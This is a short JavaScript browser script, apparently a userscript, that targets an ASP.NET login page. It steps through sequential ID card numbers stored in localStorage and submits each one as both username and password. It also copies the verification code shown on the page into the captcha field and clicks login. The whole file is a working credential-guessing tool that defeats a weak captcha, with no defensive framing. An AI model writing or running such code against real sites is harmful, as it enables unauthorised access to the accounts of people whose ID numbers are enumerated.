(function(){
var firstIdCard = "140109111111111019";//140109111111111020
var firstPhone = 18810562345;//18810562238


function isLoginPage() {
    return location.href.indexOf("UserLogin.aspx") !== -1;
}
function getNextIdCard(idCard) {
    idCard = idCard + "";
    return idCard.substring(0, 10) + (parseInt(idCard.substring(10)) + 1);
}
function getCurrentIdCard() {
    var currnetIdCard = localStorage.getItem("currnetIdCard") || firstIdCard;
    localStorage.setItem("currnetIdCard", getNextIdCard(currnetIdCard));
    return currnetIdCard;
}
function fillForm() {
    var currnetIdCard = getCurrentIdCard();
    document.querySelector("[name='ctl00$ContentPlaceHolder1$txtLoginIDCard']").value = currnetIdCard;
    document.querySelector("[name='ctl00$ContentPlaceHolder1$txtPwd']").value = currnetIdCard;
    var code = document.querySelector("[id='ContentPlaceHolder1_btnValidCode']").innerHTML;
    document.querySelector("[name='ctl00$ContentPlaceHolder1$txtValidCode']").value = code;
}
function submit() {
    document.querySelector("[name='ctl00$ContentPlaceHolder1$btnLogin']").click();

}

function start() {
    if (isLoginPage()) {
        fillForm();
        submit();
    }
}
//start();
})();